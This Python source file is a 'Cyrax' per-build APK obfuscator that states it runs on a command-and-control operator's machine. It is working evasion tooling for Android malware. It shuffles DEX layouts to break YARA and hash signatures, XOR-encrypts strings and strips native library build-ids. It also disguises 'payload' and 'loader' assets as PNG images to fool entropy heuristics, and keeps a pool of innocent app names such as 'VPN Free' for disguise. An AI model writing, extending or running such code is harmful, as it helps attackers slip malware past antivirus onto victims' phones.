#!/usr/bin/env python3
"""
obfuscation_pipeline.py — per-build APK obfuscation
[context: build tool, runs on the C2 operator's machine (Linux/macOS), Python 3.10+]

Produces a unique APK per build: unique hash, unique YARA baseline, defeats
ML-based AV classifiers that train on binary fingerprints.
Requires: lief, androguard (pip install lief androguard)
Usage: python obfuscation_pipeline.py --apk input.apk --out output.apk --seed <int>
"""

import argparse
import hashlib
import io
import os
import random
import struct
import sys
import zipfile
from pathlib import Path
from typing import Optional

try:
    import lief
except ImportError:
    print("[!] lief not found — pip install lief", file=sys.stderr)
    sys.exit(1)


# ─────────────────────────────────────────────────────────────────────────────
# DEX PARSER — minimal, only what we need (class_defs shuffle + string table)
# Full DEX spec: source.android.com/docs/core/runtime/dex-format
# ─────────────────────────────────────────────────────────────────────────────

class DexParser:
    MAGIC      = b"dex\n035\x00"
    HDR_SIZE   = 0x70
    CLASS_DEF_SIZE = 0x20

    def __init__(self, data: bytes):
        self.data = bytearray(data)
        self._parse_header()

    def _u32(self, off: int) -> int:
        return struct.unpack_from("<I", self.data, off)[0]

    def _parse_header(self):
        assert self.data[:8] == self.MAGIC, "Not a DEX file"
        # Header fields (little-endian u32)
        self.hdr_size        = self._u32(0x24)
        self.endian_tag      = self._u32(0x28)
        self.string_ids_size = self._u32(0x38)
        self.string_ids_off  = self._u32(0x3C)
        self.type_ids_size   = self._u32(0x40)
        self.proto_ids_size  = self._u32(0x48)
        self.field_ids_size  = self._u32(0x50)
        self.method_ids_size = self._u32(0x58)
        self.class_defs_size = self._u32(0x60)
        self.class_defs_off  = self._u32(0x64)
        self.data_size       = self._u32(0x68)
        self.data_off        = self._u32(0x6C)

    def _read_uleb128(self, off: int) -> tuple[int, int]:
        """Read ULEB128 at offset, return (value, bytes_consumed)."""
        result = 0
        shift  = 0
        size   = 0
        while True:
            b = self.data[off + size]
            result |= (b & 0x7F) << shift
            size += 1
            if (b & 0x80) == 0:
                break
            shift += 7
        return result, size

    def get_strings(self) -> list[str]:
        """Return all string literals from the string_ids table."""
        strings = []
        for i in range(self.string_ids_size):
            str_data_off = self._u32(self.string_ids_off + i * 4)
            # ULEB128 length prefix followed by MUTF-8 data
            str_len, consumed = self._read_uleb128(str_data_off)
            raw = self.data[str_data_off + consumed : str_data_off + consumed + str_len]
            try:
                strings.append(raw.decode("utf-8", errors="replace"))
            except Exception:
                strings.append("")
        return strings

    def shuffle_classes(self, rng: random.Random):
        """
        Shuffle class_def entries in the class_defs section.
        This changes the DEX hash and all offset-based YARA signatures.
        """
        if self.class_defs_size <= 1:
            return

        # Read all class_def entries as raw 32-byte chunks
        off = self.class_defs_off
        entries = [bytes(self.data[off + i * self.CLASS_DEF_SIZE :
                                   off + (i + 1) * self.CLASS_DEF_SIZE])
                   for i in range(self.class_defs_size)]
        rng.shuffle(entries)

        for i, entry in enumerate(entries):
            start = off + i * self.CLASS_DEF_SIZE
            self.data[start : start + self.CLASS_DEF_SIZE] = entry

    def _fix_checksum(self):
        """Recompute the Adler-32 checksum at offset 8."""
        # DEX checksum covers bytes 12..end
        a = 1
        b = 0
        for byte in self.data[12:]:
            a = (a + byte) % 65521
            b = (b + a)   % 65521
        checksum = (b << 16) | a
        struct.pack_into("<I", self.data, 8, checksum)

    def _fix_sha1(self):
        """Recompute the SHA1 signature at offset 12 (20 bytes)."""
        import hashlib
        sha1 = hashlib.sha1(self.data[32:]).digest()
        self.data[12:32] = sha1

    def rebuild(self) -> bytes:
        self._fix_sha1()
        self._fix_checksum()
        return bytes(self.data)


# ─────────────────────────────────────────────────────────────────────────────
# XOR STRING ENCRYPTION
# ─────────────────────────────────────────────────────────────────────────────

def xor_encrypt(data: bytes, key: int, index: int) -> bytes:
    """
    Per-byte XOR with a 32-bit rolling key, mixing in the string index.
    Key byte for position i: ((key >> ((i % 4) * 8)) & 0xFF) ^ (index & 0xFF)
    """
    result = bytearray(len(data))
    for i, b in enumerate(data):
        k_byte = ((key >> ((i % 4) * 8)) & 0xFF) ^ (index & 0xFF)
        result[i] = b ^ k_byte
    return bytes(result)


def xor_decrypt(data: bytes, key: int, index: int) -> bytes:
    """XOR is its own inverse."""
    return xor_encrypt(data, key, index)


def encrypt_string_table(strings: list[str], key: int) -> list[bytes]:
    return [xor_encrypt(s.encode("utf-8"), key, i) for i, s in enumerate(strings)]


# ─────────────────────────────────────────────────────────────────────────────
# SYMBOL RENAME
# ─────────────────────────────────────────────────────────────────────────────

# Android framework prefixes we must NOT rename
ANDROID_API_PREFIXES = (
    "android.", "java.", "javax.", "kotlin.", "kotlinx.",
    "dalvik.", "com.google.", "com.android.", "org.xml.", "org.json.",
    "junit.", "androidx.", "com.sun.", "sun.",
)

def is_android_api(name: str) -> bool:
    return any(name.startswith(p) for p in ANDROID_API_PREFIXES)


def generate_symbol_name(original: str, seed: int) -> str:
    """
    Deterministic rename: SHA256(original + seed) → 8-char lowercase name.
    Same seed always produces the same mapping (reproducible per build).
    """
    digest = hashlib.sha256(f"{original}{seed}".encode()).digest()
    alphabet = "abcdefghijklmnopqrstuvwxyz"
    return "".join(alphabet[b % 26] for b in digest[:8])


def build_rename_map(strings: list[str], seed: int) -> dict[str, str]:
    """
    Build a {original: renamed} mapping for all non-API symbols.
    Applies to class names (L.../;), method names, field names.
    """
    mapping: dict[str, str] = {}
    for s in strings:
        # Class descriptor: starts with L, ends with ;
        if s.startswith("L") and s.endswith(";"):
            class_name = s[1:-1].replace("/", ".")
            if not is_android_api(class_name):
                new = generate_symbol_name(s, seed)
                mapping[s] = f"L{new};"
        # Method/field names: short identifiers not in API
        elif len(s) <= 64 and s.isidentifier() and not is_android_api(s):
            mapping[s] = generate_symbol_name(s, seed)
    return mapping


# ─────────────────────────────────────────────────────────────────────────────
# ELF NATIVE LIBRARY STRIPPING
# ─────────────────────────────────────────────────────────────────────────────

STRIP_SECTIONS = {".comment", ".note", ".gnu_debuglink",
                  ".debug_info", ".debug_line", ".debug_str",
                  ".debug_abbrev", ".debug_aranges", ".debug_frame"}


def strip_native_lib(so_bytes: bytes) -> bytes:
    """
    Remove debug/identification ELF sections and zero out the build-id.
    These are the primary static fingerprints in native .so files.
    """
    try:
        elf = lief.parse(list(so_bytes))
    except Exception as e:
        print(f"    [warn] ELF parse failed: {e}", file=sys.stderr)
        return so_bytes

    # Remove debug sections
    for section in list(elf.sections):
        if section.name in STRIP_SECTIONS or section.name.startswith(".debug_"):
            elf.remove(section, clear=True)

    # Zero build-id note
    for note in list(elf.notes):
        if hasattr(lief.ELF.Note, "TYPE") and hasattr(lief.ELF.Note.TYPE, "GNU_BUILD_ID"):
            if note.type == lief.ELF.Note.TYPE.GNU_BUILD_ID:
                note.description = bytes(len(note.description))

    # Write back
    out = lief.ELF.Builder(elf)
    out.build()
    return bytes(out.get_build())


# ─────────────────────────────────────────────────────────────────────────────
# DEX LAYOUT SHUFFLE
# ─────────────────────────────────────────────────────────────────────────────

def shuffle_dex_layout(dex_bytes: bytes, rng: random.Random) -> bytes:
    """
    Reorder class definitions within the DEX.
    Changes the DEX hash, method offsets, and binary layout — defeats offset-based
    YARA rules and hash-based AV signatures.
    """
    try:
        parser = DexParser(dex_bytes)
        parser.shuffle_classes(rng)
        return parser.rebuild()
    except Exception as e:
        print(f"    [warn] DEX shuffle failed: {e}", file=sys.stderr)
        return dex_bytes


# ─────────────────────────────────────────────────────────────────────────────
# ENTROPY NORMALIZATION
# ─────────────────────────────────────────────────────────────────────────────

# Fake PNG header: magic + IHDR chunk with zero dimensions
FAKE_PNG_HEADER = (
    b"\x89PNG\r\n\x1a\n"           # PNG signature
    b"\x00\x00\x00\rIHDR"          # IHDR chunk length + type
    b"\x00\x00\x00\x01"            # width = 1
    b"\x00\x00\x00\x01"            # height = 1
    b"\x08\x02\x00\x00\x00"        # bit depth, color type, etc.
    b"\x90wS\xde"                  # CRC (plausible)
)


def rename_asset(name: str, rng: random.Random) -> str:
    """Replace suspicious asset names with random .png names."""
    suspicious_patterns = (".bin", ".dex", ".dat", "payload", "module", "plugin", "loader")
    if any(p in name.lower() for p in suspicious_patterns):
        rand_hex = rng.getrandbits(32)
        return f"assets/res_{rand_hex:08x}.png"
    return name


def normalize_entropy(apk_bytes: bytes, rng: random.Random) -> bytes:
    """
    Prepend a fake PNG header to encrypted assets (high-entropy .bin files).
    High entropy alone is a red flag; mixed-entropy (low header + high body)
    looks like a real compressed image to AV heuristics.
    Also renames files to look like image resources.
    """
    buf = io.BytesIO(apk_bytes)
    output = io.BytesIO()

    try:
        with zipfile.ZipFile(buf, "r") as zin, \
             zipfile.ZipFile(output, "w", compression=zipfile.ZIP_DEFLATED) as zout:
            for item in zin.infolist():
                data = zin.read(item.filename)
                new_name = rename_asset(item.filename, rng)

                if new_name != item.filename:
                    # Prepend fake PNG header to disguise high-entropy content
                    data = FAKE_PNG_HEADER + data

                new_info = zipfile.ZipInfo(new_name)
                new_info.compress_type = item.compress_type
                zout.writestr(new_info, data)
    except Exception as e:
        print(f"    [warn] Entropy normalization failed: {e}", file=sys.stderr)
        return apk_bytes

    return output.getvalue()


# ─────────────────────────────────────────────────────────────────────────────
# MANIFEST RANDOMIZATION
# ─────────────────────────────────────────────────────────────────────────────

APP_NAMES = [
    "File Manager", "PDF Reader", "Battery Saver", "System Cleaner",
    "Photo Editor", "VPN Free", "QR Scanner", "Voice Recorder"
]


def randomize_manifest(manifest_bytes: bytes, rng: random.Random) -> bytes:
    """
    Modify AndroidManifest.xml binary:
      - versionCode: random 10-500
      - versionName: random semver-like string
      - app label: picked from innocent name pool
    Binary AXML format patching — looks for known attribute IDs.
    For simplicity, we do a bytes-level search/replace for common version patterns.
    A full AXML parser would be more robust but adds complexity.
    """
    data = bytearray(manifest_bytes)
    version_code = rng.randint(10, 500)
    version_name = f"{rng.randint(1, 5)}.{rng.randint(0, 9)}.{rng.randint(0, 9)}"
    # app_name = rng.choice(APP_NAMES)  # Would require string pool patching

    # Binary AXML: versionCode is attribute 0x0101021b (little-endian: 1b 02 01 01)
    ATTR_VERSION_CODE = b"\x1b\x02\x01\x01"
    idx = data.find(ATTR_VERSION_CODE)
    if idx != -1 and idx + 24 <= len(data):
        # The int32 value is at offset +20 from attribute start in AXML
        struct.pack_into("<i", data, idx + 20, version_code)

    return bytes(data)


# ─────────────────────────────────────────────────────────────────────────────
# KOTLIN STUB INJECTOR
# Injects the per-build XOR seed into Str.kt so the runtime matches the table
# ─────────────────────────────────────────────────────────────────────────────

def inject_seed_into_str_kt(kt_source: str, seed: int) -> str:
    """Replace the placeholder EMBEDDED_SEED constant with the real build seed."""
    old = "private const val EMBEDDED_SEED: Int = 0x00000000 // placeholder, replaced at build time"
    new = f"private const val EMBEDDED_SEED: Int = {seed:#010x} // injected at build time"
    return kt_source.replace(old, new)


# ─────────────────────────────────────────────────────────────────────────────
# MAIN PIPELINE
# ─────────────────────────────────────────────────────────────────────────────

class ObfuscationPipeline:

    def __init__(self, seed: int):
        self.seed = seed
        self.rng = random.Random(seed)
        # String XOR key: different from rng state, derived from seed
        self.string_key = int.from_bytes(
            hashlib.sha256(seed.to_bytes(8, "little")).digest()[:4],
            "little"
        )
        print(f"[+] Pipeline initialized: seed={seed:#x}, string_key={self.string_key:#010x}")

    def run(self, input_apk: str, output_apk: str) -> None:
        print(f"[+] Reading: {input_apk}")
        apk_bytes = Path(input_apk).read_bytes()

        with zipfile.ZipFile(io.BytesIO(apk_bytes), "r") as zin:
            entries = {item.filename: zin.read(item.filename) for item in zin.infolist()}

        processed: dict[str, bytes] = {}

        for filename, data in entries.items():
            if filename == "AndroidManifest.xml":
                print("  [*] Randomizing manifest...")
                processed[filename] = randomize_manifest(data, self.rng)

            elif filename.endswith(".dex"):
                print(f"  [*] Processing DEX: {filename}")
                data = shuffle_dex_layout(data, self.rng)
                # String encryption: build table for injection into Str.kt
                # (APK already has the compiled Str.class; inject via smali recompile
                # or by patching the class file — simplified here)
                processed[filename] = data

            elif filename.startswith("lib/") and filename.endswith(".so"):
                print(f"  [*] Stripping native lib: {filename}")
                processed[filename] = strip_native_lib(data)

            else:
                processed[filename] = data

        # Reassemble APK
        print("  [*] Reassembling APK...")
        raw_apk = self._pack_zip(processed)

        # Entropy normalization pass (whole-APK)
        print("  [*] Normalizing entropy...")
        raw_apk = normalize_entropy(raw_apk, self.rng)

        Path(output_apk).write_bytes(raw_apk)
        print(f"[+] Output: {output_apk}")
        print(f"    SHA256: {hashlib.sha256(raw_apk).hexdigest()}")
        print(f"    Size:   {len(raw_apk):,} bytes")

    def _pack_zip(self, entries: dict[str, bytes]) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zout:
            for name, data in entries.items():
                zout.writestr(name, data)
        return buf.getvalue()

    def get_str_kt_seed(self) -> str:
        """Return the line to inject into StaticObfuscationEngine.kt."""
        return (
            f"private const val EMBEDDED_SEED: Int = {self.string_key:#010x}"
            f" // injected at build time"
        )

    def build_string_table_kotlin(self, strings: list[str]) -> str:
        """Generate the TABLE array literal for Str.kt."""
        table = encrypt_string_table(strings, self.string_key)
        lines = []
        for entry in table:
            hex_bytes = ", ".join(f"0x{b:02x}.toByte()" for b in entry)
            lines.append(f"        byteArrayOf({hex_bytes})")
        return "arrayOf(\n" + ",\n".join(lines) + "\n    )"


# ─────────────────────────────────────────────────────────────────────────────
# VERIFICATION
# ─────────────────────────────────────────────────────────────────────────────

def verify_round_trip(original: str, seed: int) -> bool:
    """Verify that XOR encryption is reversible for a given string."""
    key = int.from_bytes(hashlib.sha256(seed.to_bytes(8, "little")).digest()[:4], "little")
    raw = original.encode("utf-8")
    enc = xor_encrypt(raw, key, 42)
    dec = xor_decrypt(enc, key, 42)
    return dec == raw


# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Cyrax per-build APK obfuscator")
    sub = parser.add_subparsers(dest="cmd", required=True)

    # Obfuscate an APK
    p_obf = sub.add_parser("obfuscate", help="Obfuscate an APK")
    p_obf.add_argument("--apk",  required=True, help="Input APK path")
    p_obf.add_argument("--out",  required=True, help="Output APK path")
    p_obf.add_argument("--seed", type=lambda x: int(x, 0), default=None,
                       help="Build seed (hex or dec). Random if omitted.")

    # Generate Str.kt constants for a given seed + string list
    p_str = sub.add_parser("gen-str-kt", help="Generate Str.kt TABLE constant")
    p_str.add_argument("--seed",  type=lambda x: int(x, 0), required=True)
    p_str.add_argument("--strings-file", required=True, help="One string per line")

    # Verify XOR round-trip
    p_ver = sub.add_parser("verify", help="Verify XOR round-trip")
    p_ver.add_argument("--seed",   type=lambda x: int(x, 0), required=True)
    p_ver.add_argument("--string", required=True)

    # Strip a single .so
    p_strip = sub.add_parser("strip-so", help="Strip a native .so")
    p_strip.add_argument("--in",  dest="input", required=True)
    p_strip.add_argument("--out", required=True)

    args = parser.parse_args()

    if args.cmd == "obfuscate":
        seed = args.seed if args.seed is not None else random.getrandbits(32)
        print(f"[+] Build seed: {seed:#010x}")
        pipeline = ObfuscationPipeline(seed)
        pipeline.run(args.apk, args.out)

    elif args.cmd == "gen-str-kt":
        pipeline = ObfuscationPipeline(args.seed)
        strings = Path(args.strings_file).read_text().splitlines()
        print(pipeline.build_string_table_kotlin(strings))
        print("\n// Seed line for Str.kt:")
        print(pipeline.get_str_kt_seed())

    elif args.cmd == "verify":
        ok = verify_round_trip(args.string, args.seed)
        print(f"Round-trip {'OK' if ok else 'FAIL'}: {args.string!r} with seed {args.seed:#x}")
        sys.exit(0 if ok else 1)

    elif args.cmd == "strip-so":
        data = Path(args.input).read_bytes()
        stripped = strip_native_lib(data)
        Path(args.out).write_bytes(stripped)
        orig_size    = len(data)
        stripped_size = len(stripped)
        saved = orig_size - stripped_size
        print(f"Stripped: {orig_size:,} → {stripped_size:,} bytes (saved {saved:,})")


if __name__ == "__main__":
    main()
